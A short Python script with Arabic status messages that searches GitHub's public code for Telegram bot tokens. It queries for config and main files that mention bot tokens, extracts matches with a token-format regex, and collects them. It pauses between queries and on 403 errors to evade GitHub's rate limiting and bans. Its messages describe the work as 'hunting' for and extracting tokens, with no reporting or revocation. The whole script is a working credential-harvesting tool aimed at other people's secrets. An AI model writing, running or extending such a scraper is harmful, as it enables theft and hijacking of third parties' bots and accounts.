import re
import os
import time
from github import Github, GithubException

def search_for_tokens():
    token = os.getenv('GITHUB_TOKEN')
    if not token:
        print("[!] GITHUB_TOKEN غير موجود!")
        return []
        
    print("[*] بدء عملية الصيد...")
    try:
        g = Github(token)
    except Exception as e:
        print(f"[!] خطأ في الاتصال: {e}")
        return []

    found_tokens = []
    queries = [
        'filename:main.py "bot_token"',
        'filename:config.py "TOKEN"',
        '"telebot.TeleBot"',
        'telegram_token'
    ]
    
    for query in queries:
        print(f"[>] جاري فحص: {query}")
        try:
            # محاولة البحث مباشرة بدون فحص Rate Limit لتجنب الخطأ التقني
            results = g.search_code(query=query, sort='indexed', order='desc')
            
            count = 0
            for file in results:
                if count >= 3: break # تقليل العدد لزيادة السرعة وتجنب الحظر
                try:
                    content = file.decoded_content.decode('utf-8')
                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                    for token in matches:
                        if token not in found_tokens:
                            found_tokens.append(token)
                            count += 1
                except: continue
            
            print(f"[+] تم استخراج {count} توكن.")
            time.sleep(10) # تأخير إجباري لتجنب حظر الـ 403
            
        except GithubException as e:
            if e.status == 403:
                print("[!] تم حظر الطلب من GitHub (403). انتظار دقيقة...")
                time.sleep(60)
            else:
                print(f"[!] خطأ API: {e}")
        except Exception as e:
            print(f"[!] خطأ: {e}")
            
    return found_tokens
